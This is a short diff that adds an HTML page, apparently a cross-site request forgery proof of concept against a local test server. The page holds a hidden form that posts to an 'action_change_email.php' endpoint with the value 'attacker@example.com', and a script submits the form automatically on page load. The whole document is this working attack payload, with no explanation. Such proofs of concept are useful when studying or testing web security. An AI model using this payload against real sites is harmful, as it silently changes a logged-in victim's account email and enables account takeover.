@@ -1,0 +1,6 @@
+<form action="http://localhost:9000/action_change_email.php" method="POST">
+    <input type="hidden" name="email" value="attacker@example.com">
+</form>
+<script>
+  document.forms[0].submit();
+</script>
